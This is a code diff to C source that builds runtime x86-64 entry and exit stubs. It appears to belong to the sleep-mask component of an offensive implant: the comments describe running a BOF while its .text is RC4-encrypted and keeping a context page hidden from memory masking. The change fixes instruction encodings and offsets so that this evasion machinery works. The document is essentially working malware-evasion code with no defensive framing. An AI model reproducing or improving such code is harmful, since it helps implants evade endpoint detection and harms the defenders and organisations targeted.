@@ -118,9 +118,9 @@ static BW_CTX        * g_bw_ctx;     /* private RW page, never tracked/masked */
 #define BW_STATE_CLOSED 2
 
 #define BW_ENTER_OFF 0x000
-#define BW_EXIT_OFF  0x070
-#define BW_WATCH_OFF 0x100
-#define BW_CTXQ_OFF  0x180   /* after the watchdog tail-jump data qword */
+#define BW_EXIT_OFF  0x080
+#define BW_WATCH_OFF 0x110
+#define BW_CTXQ_OFF  0x190   /* after the watchdog tail-jump data qword */
 
 /* RC4-with-counter, byte-for-byte the gen3 scheme (sleepmask_gen3.cpp):
  * round-tripping a block under a DIFFERENT counter would corrupt it. */
@@ -398,9 +398,9 @@ static BOOL bw_build_pages(void)
 		e += 6;
 		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
 		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-		e[0] = 0xC7; e[1] = 0x40; e[2] = 0x98;                          /* mov dword [rax+0x98],1 */
-		e[3] = 0x01; e[4] = 0x00; e[5] = 0x00; e[6] = 0x00;
-		e += 7;
+		e[0] = 0xC7; e[1] = 0x80; e[2] = 0x98; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* mov dword [rax+0x98],1 (disp32: 0x98 is not a signed disp8) */
+		e[6] = 0x01; e[7] = 0x00; e[8] = 0x00; e[9] = 0x00;
+		e += 10;
 	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x50;            /* lea rcx,[rax+0x50] */
 	e += 4;
 	e[0] = 0x48; e[1] = 0x8D; e[2] = 0x50; e[3] = 0x60;            /* lea rdx,[rax+0x60] */
@@ -417,7 +417,7 @@ static BOOL bw_build_pages(void)
 	e += 3;
 	e[0] = 0xFF; e[1] = 0x60; e[2] = 0x20;                          /* jmp [rax+0x20] entry */
 	e += 3;
-		if ((int)(e - (p + BW_ENTER_OFF)) > 0x70)
+		if ((int)(e - (p + BW_ENTER_OFF)) > 0x80)
 			BW_BUILD_FAIL();
 
 	/* ---- exit_stub (BOF's ret lands here, rsp%16==0, .text=RW-cipher) ----
@@ -429,9 +429,9 @@ static BOOL bw_build_pages(void)
 	e = p + BW_EXIT_OFF;
 	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
 	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-	e[0] = 0xC7; e[1] = 0x40; e[2] = 0x98;                          /* mov dword [rax+0x98],3 */
-	e[3] = 0x03; e[4] = 0x00; e[5] = 0x00; e[6] = 0x00;
-	e += 7;
+		e[0] = 0xC7; e[1] = 0x80; e[2] = 0x98; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* mov dword [rax+0x98],3 (disp32) */
+		e[6] = 0x03; e[7] = 0x00; e[8] = 0x00; e[9] = 0x00;
+		e += 10;
 	e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
 	e += 5;
 	e[0] = 0x87; e[1] = 0x08;                                        /* xchg ecx,[rax] */
